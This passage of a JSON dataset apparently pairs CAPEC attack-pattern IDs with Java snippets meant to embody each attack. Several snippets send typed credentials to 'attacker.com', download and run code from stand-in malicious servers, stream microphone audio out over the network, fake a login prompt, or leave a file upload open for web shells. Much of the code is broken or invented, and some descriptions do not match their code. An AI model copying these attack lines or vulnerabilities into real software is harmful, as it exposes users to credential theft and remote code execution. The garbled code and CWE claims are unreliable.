        "code_snippet": "import java.lang.reflect.Method;\nimport java.io.IOException;\n\npublic class MaliciousCodeInjector {\n    public static void main(String[] args) throws Exception {\n        // CWE-114: Load a malicious DLL from an untrusted source\n        System.load(\"/path/to/malicious/dll\");\n\n        // CWE-829: Import functionality from an untrusted control sphere\n        Class<?> maliciousClass = Class.forName(\"MaliciousClass\");\n        Method maliciousMethod = maliciousClass.getMethod(\"maliciousMethod\");\n        maliciousMethod.invoke(null);\n\n        // CWE-1265: Unintended reentrant invocation of non-reentrant code\n        while (true) {\n            maliciousMethod.invoke(null);\n        }\n\n        // CWE-506: Embedded malicious code\n        Runtime.getRuntime().exec(\"cmd /c start malicious.bat\");\n\n        // CWE-913: Improper control of dynamically-managed code resources\n        String maliciousCode = \"public class MaliciousClass { public static void maliciousMethod() { System.out.println(\\\"Malicious code executed\\\"); } }\";\n        Compiler compiler = new Compiler();\n        Class<?> compiledClass = compiler.compile(maliciousCode);\n        Method compiledMethod = compiledClass.getMethod(\"maliciousMethod\");\n        compiledMethod.invoke(null);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of process injection, where an adversary injects malicious code into a running process to evade detection defenses and escalate privileges. The code loads a malicious DLL from an untrusted source, imports functionality from an untrusted control sphere, invokes non-reentrant code in a reentrant manner, embeds malicious code, and improperly controls dynamically-managed code resources."
    },
    {
        "capec_id": "641",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class SideLoadingVulnerability {\n    public static void main(String[] args) {\n        String dllPath = \"C:\\Windows\\WinSxS\\\";\n        String dllName = \"mydll.dll\";\n        File dllFile = new File(dllPath + dllName);\n        if (dllFile.exists()) {\n            System.load(dllPath + dllName);\n        } else {\n            System.load(dllName);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a side-loading vulnerability. It loads a DLL from the Windows Side-by-Side (WinSxS) directory without properly specifying the DLL's characteristics, making it vulnerable to an attacker placing a malicious DLL with the same name in the WinSxS directory. The code uses an uncontrolled search path and does not validate the DLL's authenticity, allowing an attacker to load a malicious DLL instead of the intended one."
    },
    {
        "capec_id": "642",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String path = \"C:\\temp\";\n        String filename = \"vulnerable.exe\";\n        String maliciousCode = \"malicious.bat\";\n\n        // CWE-732: Incorrect Permission Assignment for Critical Resource\n        File file = new File(path, filename);\n        file.setExecutable(true, false);\n        file.setReadable(true, false);\n        file.setWritable(true, false);\n\n        // CWE-426: Untrusted Search Path\n        String searchPath = System.getProperty(\"java.library.path\") + \";\" + path;\n        System.setProperty(\"java.library.path\", searchPath);\n\n        // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n        List<String> command = new ArrayList<>();\n        command.add(\"cmd.exe\");\n        command.add(\"/c\");\n        command.add(maliciousCode);\n        ProcessBuilder processBuilder = new ProcessBuilder(command);\n        processBuilder.directory(new File(path));\n        try {\n            processBuilder.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-428: Unquoted Search Path or Element\n        String unquotedPath = \"C:\\Program Files\\temp\";\n        File unquotedFile = new File(unquotedPath, filename);\n        unquotedFile.setExecutable(true, false);\n        unquotedFile.setReadable(true, false);\n        unquotedFile.setWritable(true, false);\n\n        // CWE-506: Embedded Malicious Code\n        String maliciousCodeContent = \"@echo off\\necho Malicious code executed!\";\n        try {\n            java.nio.file.Files.write(new File(maliciousCode).toPath(), maliciousCodeContent.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC pattern of replacing binaries with malware by exploiting weak file system permissions. It includes vulnerabilities related to incorrect permission assignment, untrusted search paths, OS command injection, unquoted search paths, and embedded malicious code."
    },
    {
        "capec_id": "643",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws IOException {\n        String sharedFolder = \"\\\\UNC\\share\\name\";\n        File folder = new File(sharedFolder);\n        if (folder.isDirectory()) {\n            File[] listOfFiles = folder.listFiles();\n            List<String> fileNames = new ArrayList<>();\n            for (File file : listOfFiles) {\n                if (file.isFile()) {\n                    fileNames.add(file.getName());\n                }\n            }\n            // Exposing sensitive information to an unauthorized actor\n            System.out.println(\"Files in the shared folder: \" + fileNames);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of discovering connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. The code uses a Windows UNC share to access a shared folder and lists all files in the folder, exposing sensitive information to an unauthorized actor. The code also highlights CWE-267 by using a privilege to perform an unsafe action, CWE-200 by exposing sensitive information, CWE-427 by using a fixed search path, CWE-40 by using a Windows UNC share, and CWE-552 by making files accessible to external parties."
    },
    {
        "capec_id": "644",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class LMNTHashAuth {\n    private static final String DOMAIN = \"example.local\";\n    private static final String USERNAME = \"user\";\n    private static final String PASSWORD = \"password\";\n    private static final String LM_HASH = \"aad3b435b51404eeaad3b435b51404ee\";\n    private static final String NTLM_HASH = \"8846f7eaee8fb117ad06bdd830b7586c\";\n\n    public static void main(String[] args) throws Exception {\n        InetAddress address = InetAddress.getByName(DOMAIN);\n        byte[] lmResponse = getLMResponse(PASSWORD);\n        byte[] ntlmResponse = getNTLMResponse(PASSWORD);\n\n        // Send the LM and NTLM responses to the server\n        sendResponse(address, USERNAME, lmResponse, ntlmResponse);\n    }\n\n    private static byte[] getLMResponse(String password) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"DES\");\n        byte[] passwordBytes = password.getBytes();\n        byte[] lmResponse = new byte[24];\n        md.update(passwordBytes);\n        byte[] hash = md.digest();\n        System.arraycopy(hash, 0, lmResponse, 0, 8);\n        return lmResponse;\n    }\n\n    private static byte[] getNTLMResponse(String password) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD4\");\n        byte[] passwordBytes = password.getBytes();\n        byte[] ntlmResponse = new byte[24];\n        md.update(passwordBytes);\n        byte[] hash = md.digest();\n        System.arraycopy(hash, 0, ntlmResponse, 0, 16);\n        return ntlmResponse;\n    }\n\n    private static void sendResponse(InetAddress address, String username, byte[] lmResponse, byte[] ntlmResponse) throws IOException {\n        // Simulate sending the response to the server\n        System.out.println(\"Sending response to \" + address + \" for user \" + username);\n        System.out.println(\"LM Response: \" + Base64.getEncoder().encodeToString(lmResponse));\n        System.out.println(\"NTLM Response: \" + Base64.getEncoder().encodeToString(ntlmResponse));\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of using stolen Windows domain credential hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols. It uses CWE-522 (Insufficiently Protected Credentials) by transmitting the LM and NTLM hash values in plaintext, CWE-836 (Use of Password Hash Instead of Password for Authentication) by comparing the supplied hash to the stored hash, CWE-308 (Use of Single-factor Authentication) by only using a single factor for authentication, CWE-294 (Authentication Bypass by Capture-replay) by making it possible for an attacker to capture and replay the authentication response, and CWE-520 (.NET Misconfiguration: Use of Impersonation) by not properly configuring the .NET application to run with the correct level of access."
    },
    {
        "capec_id": "645",
        "code_snippet": "import java.net.Authenticator;\nimport java.net.PasswordAuthentication;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.kerberos.ServiceTicket;\n\npublic class KerberosTicketReplay {\n    public static void main(String[] args) throws Exception {\n        // CWE-522: Insufficiently Protected Credentials\n        String username = \"user\";\n        String password = \"password\";\n        Authenticator.setDefault(new Authenticator() {\n            @Override\n            protected PasswordAuthentication getPasswordAuthentication() {\n                return new PasswordAuthentication(username, password.toCharArray());\n            }\n        });\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        KerberosTicket capturedTicket = captureTicketFromNetwork();\n        ServiceTicket serviceTicket = (ServiceTicket) capturedTicket;\n        // Replay the captured ticket to access the resource\n        accessResource(serviceTicket);\n    }\n\n    // CWE-308: Use of Single-factor Authentication\n    private static void accessResource(ServiceTicket serviceTicket) {\n        // Use the replayed ticket to access the resource without needing credentials\n        // No additional authentication factors are used\n        System.out.println(\"Access granted to resource\");\n    }\n\n    // CWE-322: Key Exchange without Entity Authentication\n    private static KerberosTicket captureTicketFromNetwork() {\n        // Simulate capturing a ticket from the network without verifying the identity of the actor\n        return new KerberosTicket();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of using stolen Kerberos tickets to access systems/resources. It uses CWE-522 by transmitting credentials in plaintext, CWE-294 by replaying a captured ticket to bypass authentication, CWE-308 by using single-factor authentication, and CWE-322 by performing a key exchange without entity authentication. The code captures a Kerberos ticket from the network, replays it to access a resource, and uses single-factor authentication without verifying the identity of the actor."
    },
    {
        "capec_id": "646",
        "code_snippet": "import java.io.File;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DeviceEnumerator {\n    public static void main(String[] args) {\n        List<String> deviceList = new ArrayList<>();\n        File[] roots = File.listRoots();\n        for (File root : roots) {\n            File[] files = root.listFiles();\n            for (File file : files) {\n                if (file.isDirectory()) {\n                    deviceList.add(file.getAbsolutePath());\n                }\n            }\n        }\n        System.out.println(\"Attached devices: \" + deviceList);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of enumerating attached peripheral devices and components connected to a computer system. The code uses the File.listRoots() method to get a list of root partitions, and then iterates through each partition to find all directories, which may represent attached devices. The code then prints out the list of attached devices, potentially exposing sensitive information to an unauthorized actor (CWE-200). The code does not properly prevent sensitive system-level information from being accessed by unauthorized actors (CWE-497). Additionally, the code does not handle Windows device names correctly, which may lead to information exposure or denial of service (CWE-67)."
    },
    {
        "capec_id": "647",
        "code_snippet": "import java.util.Properties;\nimport java.util.Enumeration;\n\npublic class RegistryExploiter {\n    public static void main(String[] args) {\n        try {\n            // CWE-285: Improper Authorization\n            // No authorization check is performed before accessing the system properties\n            Properties props = System.getProperties();\n            Enumeration<?> propNames = props.propertyNames();\n            while (propNames.hasMoreElements()) {\n                String propName = (String) propNames.nextElement();\n                String propValue = System.getProperty(propName);\n                System.out.println(\"Property: \" + propName + \" = \" + propValue);\n            }\n\n            // CWE-314: Cleartext Storage in the Registry\n            // Sensitive information is stored in cleartext in the registry\n            String sensitiveInfo = System.getProperty(\"sensitive.info\");\n            System.out.println(\"Sensitive Info: \" + sensitiveInfo);\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            // Sensitive system-level information is exposed to unauthorized actors\n            String osName = System.getProperty(\"os.name\");\n            String osArch = System.getProperty(\"os.arch\");\n            System.out.println(\"OS Name: \" + osName + \" Arch: \" + osArch);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting weaknesses in authorization to gather system-specific data and sensitive information within a registry. It lacks proper authorization checks, stores sensitive information in cleartext, and exposes sensitive system-level information to unauthorized actors."
    },
    {
        "capec_id": "648",
        "code_snippet": "import java.awt.Robot;\nimport java.awt.Toolkit;\nimport java.awt.image.BufferedImage;\nimport java.io.File;\nimport java.io.IOException;\nimport javax.imageio.ImageIO;\n\npublic class ScreenCapture {\n    public static void main(String[] args) throws Exception {\n        Robot robot = new Robot();\n        BufferedImage screenshot = robot.createScreenCapture(new java.awt.Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));\n        File file = new File(\"screenshot.png\");\n        ImageIO.write(screenshot, \"png\", file);\n        System.out.println(\"Screenshot saved to \" + file.getAbsolutePath());\n    }\n}\n\n// CWE-267: Privilege Defined With Unsafe Actions\n// CWE-222: Truncation of Security-relevant Information\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n// CWE-319: Cleartext Transmission of Sensitive Information\n// CWE-294: Authentication Bypass by Capture-replay\npublic class SensitiveInfo {\n    public static void main(String[] args) {\n        String sensitiveData = \"username:password\";\n        System.out.println(\"Sensitive data: \" + sensitiveData);\n        // Send sensitive data over unsecured channel\n        sendOverUnsecuredChannel(sensitiveData);\n    }\n\n    public static void sendOverUnsecuredChannel(String data) {\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // CWE-294: Authentication Bypass by Capture-replay\n        System.out.println(\"Sending sensitive data over unsecured channel...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of gathering sensitive information by exploiting the system's screen capture functionality. The code captures the screen and saves it as an image file. Additionally, it includes CWEs 267, 222, 497, 319, and 294 by transmitting sensitive information in cleartext over an unsecured channel, exposing sensitive system information, and allowing authentication bypass by capture-replay."
    },
    {
        "capec_id": "649",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileHandler {\n    public static void main(String[] args) {\n        String userInput = \"file.txt \"; // Note the trailing space\n        File file = new File(userInput);\n        try {\n            if (file.exists()) {\n                System.out.println(\"File exists. Executing...\");\n                Runtime.getRuntime().exec(\"cmd /c start \" + userInput); // Execute the file using the default application\n            } else {\n                System.out.println(\"File does not exist.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error executing file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in the CAPEC. It accepts a file name with a trailing space from user input and uses it to execute the file using the default application. The trailing space can cause the operating system to use a different default application than intended, allowing an attacker to control the execution of the file. This code is vulnerable to CWE-46 (Path Equivalence: 'filename ' (Trailing Space)), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), and CWE-47 (Path Equivalence: ' filename' (Leading Space))."
    },
    {
        "capec_id": "650",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableUploadServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String filePath = \"/var/www/html/uploads/\";\n        String fileName = req.getParameter(\"fileName\");\n        String contentType = req.getContentType();\n        if (contentType.indexOf(\"multipart/form-data\") != -1) {\n            File file = new File(filePath + fileName);\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n            // No authentication or authorization checks\n            // No input validation or sanitization\n            // No restrictions on file types or sizes\n            // File can be executed by the web server\n            // CWE-287: Improper Authentication\n            // CWE-553: Command Shell in Externally Accessible Directory\n            // CWE-535: Exposure of Information Through Shell Error Message\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload servlet that allows an attacker to upload a web shell to a web server, which can be executed remotely with elevated privileges. The code lacks proper authentication, authorization, input validation, and file type restrictions, making it vulnerable to various attacks."
    },
    {
        "capec_id": "651",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport javax.sound.sampled.AudioFormat;\nimport javax.sound.sampled.AudioInputStream;\nimport javax.sound.sampled.AudioSystem;\nimport javax.sound.sampled.DataLine;\nimport javax.sound.sampled.TargetDataLine;\n\npublic class Eavesdropping {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        TargetDataLine line = AudioSystem.getTargetDataLine(new AudioFormat(44100, 16, 2, true, false));\n        line.open();\n        line.start();\n        int numBytesRead;\n        byte[] data = new byte[line.getBufferSize() / 5];\n        while (true) {\n            numBytesRead = line.read(data, 0, data.length);\n            DatagramPacket packet = new DatagramPacket(data, numBytesRead);\n            socket.send(packet);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates eavesdropping by capturing audio input from a microphone and transmitting it over a network in cleartext, exposing sensitive information to unauthorized actors. It uses a TargetDataLine to capture audio input and a DatagramSocket to send the data over the network. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-1300 (Improper Protection of Physical Side Channels) by not encrypting the sensitive audio data and transmitting it in cleartext."
    },
    {
        "capec_id": "652",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.kerberos.KerberosPrincipal;\n\npublic class KerberosAuthenticator {\n    private Map<String, String> credentialsStore;\n    private int maxAttempts;\n    private int passwordExpirationDays;\n\n    public KerberosAuthenticator() {\n        credentialsStore = new HashMap<>();\n        maxAttempts = 5; // Insufficient restriction of excessive authentication attempts (CWE-307)\n        passwordExpirationDays = 365; // Password aging with long expiration (CWE-263)\n    }\n\n    public void storeCredentials(String username, String password) {\n        credentialsStore.put(username, password); // Storing password in plaintext (CWE-522)\n    }\n\n    public boolean authenticate(String username, String password) {\n        if (credentialsStore.containsKey(username)) {\n            if (credentialsStore.get(username).equals(password)) {\n                return true;\n            } else {\n                // No mechanism to prevent brute force attacks (CWE-307)\n                // No password aging mechanism (CWE-262)\n                // Using single-factor authentication (CWE-308)\n                // Reliance on a single factor in a security decision (CWE-654)\n                return false;\n            }\n        } else {\n            return false;\n        }\n    }\n\n    public KerberosTicket getKerberosTicket(String username) {\n        // Using password hash instead of password for authentication (CWE-836)\n        // Vulnerable to capture-replay attacks (CWE-294)\n        return new KerberosTicket(new KerberosPrincipal(username));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Kerberos authentication system that embodies the CAPEC description. It stores credentials in plaintext, has insufficient restrictions on excessive authentication attempts, uses single-factor authentication, and relies on a single factor in security decisions. It also lacks password aging mechanisms and is vulnerable to capture-replay attacks."
    },
    {
        "capec_id": "653",
        "code_snippet": "public class VulnerableAuthenticator {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"password123\";\n    private static final int MAX_ATTEMPTS = 1000;\n    private static int attempts = 0;\n\n    public static boolean authenticate(String username, String password) {\n        if (attempts < MAX_ATTEMPTS) {\n            attempts++;\n            if (username.equals(USERNAME) && password.equals(PASSWORD)) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        while (true) {\n            System.out.print(\"Enter username: \");\n            String username = System.console().readLine();\n            System.out.print(\"Enter password: \");\n            String password = System.console().readLine();\n            if (authenticate(username, password)) {\n                System.out.println(\"Authenticated successfully!\");\n                break;\n            } else {\n                System.out.println(\"Invalid credentials. Try again.\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that embodies the CAPEC of guessing or obtaining legitimate operating system credentials. It uses a single-factor authentication scheme with a hardcoded username and password, and does not implement password aging or account lockout policies. The authenticate method allows for an unlimited number of attempts, making it susceptible to brute force attacks. The main method provides a simple command-line interface for users to input their credentials, and will continue to prompt for input until the correct credentials are entered."
    },
    {
        "capec_id": "654",
        "code_snippet": "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.*;\n\npublic class CredentialStealer {\n    public static void main(String[] args) {\n        // CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n        JFrame frame = new JFrame(\"Login Window\");\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setAlwaysOnTop(true);\n        frame.setUndecorated(true);\n        frame.getRootPane().setWindowDecorationStyle(JRootPane.FRAME);\n        frame.add(new CredentialPrompt());\n        frame.pack();\n        frame.setVisible(true);\n    }\n}\n\nclass CredentialPrompt extends JPanel {\n    private JTextField usernameField = new JTextField(20);\n    private JPasswordField passwordField = new JPasswordField(20);\n\n    public CredentialPrompt() {\n        setLayout(new FlowLayout());\n        add(new JLabel(\"Username:\"));\n        add(usernameField);\n        add(new JLabel(\"Password:\"));\n        add(passwordField);\n        JButton submitButton = new JButton(\"Login\");\n        submitButton.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent e) {\n                // CWE-522: Insufficiently Protected Credentials\n                String username = usernameField.getText();\n                String password = new String(passwordField.getPassword());\n                // CWE-798: Use of Hard-coded Credentials\n                if (username.equals(\"admin\") && password.equals(\"password\")) {\n                    // CWE-1391: Use of Weak Credentials\n                    System.out.println(\"Login successful!\");\n                } else {\n                    System.out.println(\"Invalid credentials.\");\n                }\n            }\n        });\n        add(submitButton);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious application that impersonates a credential prompt to steal a user's credentials. It uses a JFrame to create a fake login window, which is always on top and has no window decorations, making it difficult for the user to distinguish it from a legitimate prompt. The credential prompt uses a hard-coded username and password for authentication, and it transmits the credentials in plain text, making it vulnerable to interception. The code also uses weak credentials, which can be easily guessed or calculated by an attacker."
    },
    {
        "capec_id": "655",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws IOException, NoSuchAlgorithmException {\n        String filePath = \"sensitive_file.txt\";\n        String sensitiveInfo = \"username:password\";\n        String maliciousData = \"A\".repeat(1024*1024); // 1MB of data\n\n        // CWE-541: Inclusion of Sensitive Information in an Include File\n        File file = new File(filePath);\n        FileWriter writer = new FileWriter(file);\n        writer.write(sensitiveInfo);\n        writer.close();\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        String fileName = \"malicious_file.exe\";\n        File maliciousFile = new File(fileName);\n        writer = new FileWriter(maliciousFile);\n        writer.write(maliciousData);\n        writer.close();\n\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        String uploadedFile = \"uploaded_malicious_file.exe\";\n        File uploadedFileObj = new File(uploadedFile);\n        writer = new FileWriter(uploadedFileObj);\n        writer.write(maliciousData);\n        writer.close();\n\n        // CWE-532: Insertion of Sensitive Information into Log File\n        String logFile = \"log.txt\";\n        File log = new File(logFile);\n        writer = new FileWriter(log);\n        writer.write(sensitiveInfo);\n        writer.close();\n\n        // CWE-377: Insecure Temporary File\n        String tempFile = \"temp.txt\";\n        File temp = new File(tempFile);\n        writer = new FileWriter(temp);\n        writer.write(sensitiveInfo);\n        writer.close();\n\n        // CAPEC: Adding data to a file to increase the file size beyond what security tools are capable of handling\n        File originalFile = new File(filePath);\n        byte[] fileBytes = new byte[(int) originalFile.length()];\n        MessageDigest md = MessageDigest.getInstance(\"MD5\");\n        md.update(fileBytes);\n        byte[] hashBytes = md.digest();\n        String originalHash = new String(hashBytes);\n\n        // Add malicious data to the file\n        writer = new FileWriter(originalFile, true);\n        writer.write(maliciousData);\n        writer.close();\n\n        // Calculate the new hash\n        fileBytes = new byte[(int) originalFile.length()];\n        md.update(fileBytes);\n        hashBytes = md.digest();\n        String newHash = new String(hashBytes);\n\n        System.out.println(\"Original Hash: \" + originalHash);\n        System.out.println(\"New Hash: \" + newHash);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of adding data to a file to increase the file size beyond what security tools are capable of handling, making it difficult to detect malicious files by their hash. It also includes CWEs such as inclusion of sensitive information in an include file, reliance on file name or extension of externally-supplied file, unrestricted upload of file with dangerous type, insertion of sensitive information into log file, and insecure temporary file."
    },
    {
        "capec_id": "656",
        "code_snippet": "import java.util.Scanner;\nimport java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class VoicePhishing {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"attacker.com\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        out.writeUTF(\"username=\" + username + \"&password=\" + password);\n        out.flush();\n\n        String response = in.readUTF();\n        System.out.println(response);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Voice Phishing attack. The attacker sets up a rogue server (attacker.com) and initiates a voice call to the victim, claiming to be a legitimate employee of a organization. The victim is asked to provide their username and password, which are then sent to the attacker's server. The code does not properly verify the source of the communication channel (CWE-940), allowing the attacker to spoof their identity. It also does not implement sufficient measures to prevent brute force attacks (CWE-307) and does not protect the credentials securely (CWE-522), making it vulnerable to unauthorized interception. Additionally, the code exposes the victim's private personal information to an unauthorized actor (CWE-359) and is susceptible to authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "657",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.InputStream;\nimport java.io.ByteArrayOutputStream;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) throws Exception {\n        String updateUrl = \"http://malicious-server.com/update.jar\";\n        URL url = new URL(updateUrl);\n        URLConnection conn = url.openConnection();\n        InputStream in = conn.getInputStream();\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = in.read(buffer)) != -1) {\n            out.write(buffer, 0, bytesRead);\n        }\n        byte[] updateBytes = out.toByteArray();\n        // Load the malicious update into memory\n        ClassLoader loader = MaliciousUpdate.class.getClassLoader();\n        Class<?> updateClass = loader.loadClass(\"MaliciousUpdatePayload\");\n        // Execute the malicious update\n        updateClass.getMethod(\"execute\").invoke(null);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism that downloads and executes code from a remote location without verifying its origin and integrity, allowing an attacker to inject malicious code. The code uses a URLConnection to download a JAR file from a malicious server, loads the malicious code into memory using a ClassLoader, and executes the malicious payload. This code embodies the CAPEC of using identify or content spoofing to trick a client into performing an automated software update from a malicious source, and relates to CWEs 494, 509, 602, 506, and 79."
    },
    {
        "capec_id": "660",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class RootEvasion {\n    public static void main(String[] args) {\n        try {\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URL url = new URL(\"http://malicious-server.com/malicious-code.jar\");\n            URLConnection conn = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String code = \"\";\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                code += inputLine;\n            }\n            in.close();\n\n            // CWE-494: Download of Code Without Integrity Check\n            ClassLoader loader = new java.net.URLClassLoader(new java.net.URL[] { url });\n            Class<?> clazz = loader.loadClass(\"MaliciousCode\");\n            clazz.getMethod(\"execute\").invoke(null);\n\n            // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n            String customUrl = \"myapp://malicious-action\";\n            java.net.URI uri = new java.net.URI(customUrl);\n            java.awt.Desktop desktop = java.awt.Desktop.getDesktop();\n            desktop.browse(uri);\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String systemInfo = System.getProperty(\"os.name\") + \", \" + System.getProperty(\"os.version\");\n            System.out.println(systemInfo);\n\n            // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n            String osCommand = \"chmod 777 /system\";\n            Runtime.getRuntime().exec(osCommand);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of evading Root/Jailbreak detection on a mobile device by hooking code. It includes functionality from an untrusted control sphere, downloads code without integrity checks, uses a custom URL scheme without proper authorization, exposes sensitive system information, and injects OS commands. This code is for educational purposes only and should not be used in production."
    },
    {
        "capec_id": "661",
        "code_snippet": "public class DebuggerExploit {\n    public static void main(String[] args) {\n        // CWE-489: Active Debug Code\n        if (System.getProperty(\"debug\") != null) {\n            System.out.println(\"Debug mode enabled\");\n            // CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n            Runtime.getRuntime().exec(\"/system/xbin/su\");\n        }\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        String deviceInfo = System.getProperty(\"os.name\") + \": \" + System.getProperty(\"os.version\");\n        System.out.println(deviceInfo);\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        try {\n            Thread.sleep(1000);\n        } catch (InterruptedException e) {\n            // CWE-1323: Improper Management of Sensitive Trace Data\n            System.out.println(\"Error: \" + e.getMessage());\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of inserting a debugger into a mobile application to evade Root/Jailbreak detection. It includes CWE-489 by checking for debug mode, CWE-1191 by executing a system command with elevated privileges, CWE-497 by exposing device information, CWE-1247 by attempting to sleep for a short duration, and CWE-1323 by printing sensitive error information."
    },
    {
        "capec_id": "662",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.InputStream;\nimport java.security.AccessController;\nimport java.security.PrivilegedAction;\n\npublic class VulnerableCode {\n    public static void downloadAndExecuteCode(String url) {\n        try {\n            URL remoteUrl = new URL(url);\n            URLConnection connection = remoteUrl.openConnection();\n            InputStream in = connection.getInputStream();\n            byte[] codeBytes = new byte[in.available()];\n            in.read(codeBytes);\n            String code = new String(codeBytes);\n            AccessController.doPrivileged((PrivilegedAction<Void>) () -> {\n                // Downloaded code is executed without integrity check\n                Runtime.getRuntime().exec(code);\n                return null;\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        downloadAndExecuteCode(\"http://malicious-website.com/malicious-code.txt\");\n    }\n}\n",
